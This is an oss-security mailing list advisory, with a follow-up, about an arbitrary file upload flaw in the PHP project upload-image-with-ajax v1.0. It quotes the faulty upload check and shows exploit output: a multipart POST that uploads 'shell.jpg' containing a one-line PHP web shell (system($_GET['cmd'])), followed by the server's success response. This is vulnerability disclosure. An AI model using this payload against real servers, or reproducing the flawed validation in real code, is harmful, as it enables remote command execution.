  oss-security - Re: Arbitrary file upload vulnerability in upload-image-with-ajax  v1.0            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Mon, 23 Dec From: "Larry W. Cashdollar" <larry0@...com> To: Open Security <oss-security@...ts.openwall.com> Subject: Re: Arbitrary file upload vulnerability in upload-image-with-ajax  v1.0  Hello,  An update and a correction.  The CVE number should be  The software author also has fixed the vulnerability:   Thanks, Larry  ďťżOn PM, "Larry W. Cashdollar" <larry0@...com> wrote:      Title: Arbitrary file upload vulnerability in upload-image-with-ajax     Author: Larry W. Cashdollar     Date:         Download Site: https://github.com/abcprintf/upload-image-with-ajax/     Vendor: adcprintf     Vendor Notified:     Vendor Contact: wh.cprintf@...il.com     Advisory:     Description: upload-image-with-ajax     Vulnerability:     The code below changes the $ready flag to true if the file conforms to the size of < Reversing the check that the file is an image. So, a .php file can be uploaded with only a warning allowing code execution.          $ready = false;     if((($imageType == "image/jpeg") || ($imageType == "image/jpg") || ($imageType == "image/png"))&&in_array($fileExt, $validext)){     $ready = true;     }else{     echo "was not an image     ";     /You should abort the upload right here/     }     if($_FILES["fileUpload"]["size"] <     $ready = true;     echo "file size is ".$_FILES['fileUpload']["size"]."     ";     }else{     echo "file was TOO BIG!";     }          Exploit Code:      $ ./fileupload_exploit 80 /upload-image-with-ajax/upload.php     POST request size is bytes           Sending Payload:     POST //upload-image-with-ajax/upload.php HTTP/1.1     Host:     User-Agent: File Upload Exploiter/v1.2     Accept: */*     Content-Length:     Content-Type: multipart/form-data;               Content-Disposition: form-data; name="fileUpload"; filename="shell.jpg"     Content-Type: image/jpeg           <?php $cmd=$_GET['cmd']; system($cmd);?>                     HTTP/1.1 OK     Date: Mon, 16 Dec GMT     Server: (Debian)     Content-Length: 37     Content-Type: text/html; charset=UTF-8           file size is 42<br>upload successful!     [+] Total bytes read:         Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      